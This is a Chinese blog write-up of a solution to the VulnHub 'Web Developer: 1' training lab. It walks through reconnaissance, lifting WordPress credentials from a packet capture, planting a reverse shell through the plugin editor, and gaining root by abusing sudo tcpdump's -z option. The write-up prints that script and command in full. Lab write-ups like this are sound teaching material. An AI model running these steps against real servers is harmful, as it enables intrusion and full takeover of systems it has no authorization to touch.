---
title: VulnHub Web Developer：1
date: 2026-05-04 18:30:00
categories: 
  - VulnHub
tags:
  - 弱口令
  - tcpdump 提权
  - CTF
---

# Web Developer：1

项目地址：https://download.vulnhub.com/webdeveloper/WebDeveloper.ova

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69f87e08b681ce9bfd1f08ba.png)

## CTF

### 流量分析

使用 dirb 发现隐藏目录

![](https://pic1.imgdb.cn/item/69f88026b681ce9bfd1f08d4.png)

访问给了一个流量包

![](https://pic1.imgdb.cn/item/69f885feb681ce9bfd1f091c.png)

过滤 HTTP 后发现有对 wordporess 站点的流量，再次过滤请求方法为 POST 的

![](https://pic1.imgdb.cn/item/69f886b1b681ce9bfd1f0953.png)

追踪 HTTP 流拿到账号密码

```
log=webdeveloper
pwd=Te5eQg&4sBS!Yr$)wf%(DcAd
```

![](https://pic1.imgdb.cn/item/69f886e4b681ce9bfd1f0959.png)

## 弱口令

### wordpress

使用上面的账号密码成功登录后台

![](https://pic1.imgdb.cn/item/69f887adb681ce9bfd1f0966.png)

## RCE

### Plugins

在后台找到一个编辑 PHP 文件的功能

```
Plugins -> Editor -> akismet.php
```

替换为反弹 Shell

![](https://pic1.imgdb.cn/item/69f889b8b681ce9bfd1f0987.png)

再去访问文件触发

```http
http://192.168.110.157/wp-content/plugins/akismet/akismet.php
```

拿到 Shell

![](https://pic1.imgdb.cn/item/69f88aa2b681ce9bfd1f3f9b.png)

## 提权

### wp-config 敏感信息泄露

翻 wordpress 的数据库配置文件拿到用户名密码

![](https://pic1.imgdb.cn/item/69f88b23b681ce9bfd1f3fa7.png)

SSH 成功连接上

![](https://pic1.imgdb.cn/item/69f88b94b681ce9bfd1f3fb6.png)

### tcpdump 提权

检查权限，给了 `tcpdump` 这个命令

`tcpdump` 是一款经典的网络抓包工具，简单来说，它的作用就是捕获流经网卡的网络数据包，并将其内容记录下来或实时显示

![](https://pic1.imgdb.cn/item/69f88f56b681ce9bfd1f3ffa.png)

`tcpdump` 有一个名为 `-z` 的参数，该参数用于在每个数据包保存文件滚动时执行一个指定的命令或脚本

我们创建一个简单的 Shell 脚本，其目的是将 `/bin/bash` 复制一份并赋予 SUID 权限

```bash
# 在 /tmp 目录下创建一个脚本
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/.priv.sh
chmod +x /tmp/.priv.sh
```

我们需要通过 `tcpdump` 的参数来触发这个脚本：

- **`-i eth0`**  
  指定网卡，可以是任意存在的网卡，甚至回环口 `lo`

- **`-w /dev/null`**  
  将捕获的内容写入文件，必须有写文件操作才能触发 `-z`

- **`-C 1`**  
  限制每个文件的大小（单位为兆字节），设为最小的 `1`，以便快速写满并触发滚动

- **`-z /tmp/.priv.sh`**  
  核心参数，文件滚动时执行我们的脚本

由于我们可能无法在流量小的环境下等到写满 1MB，通常可以通过本地发包或直接构造触发

但在大多数 Linux 版本下，有一个更简单的直接触发技巧

`-G 1` 表示每隔 1 秒滚动一次文件，这将强制 `tcpdump` 在 1 秒后执行我们的 `/tmp/.priv.sh`

```bash
sudo /usr/sbin/tcpdump -i lo -G 1 -z /tmp/.priv.sh -w /dev/null
```

![](https://pic1.imgdb.cn/item/69f89064b681ce9bfd1f4005.png)

在另一个终端 `Ping` 一下本地即可看到生成的文件

![](https://pic1.imgdb.cn/item/69f8907fb681ce9bfd1f4006.png)

运行拿到 Root Shell

![](https://pic1.imgdb.cn/item/69f890a7b681ce9bfd1f400a.png)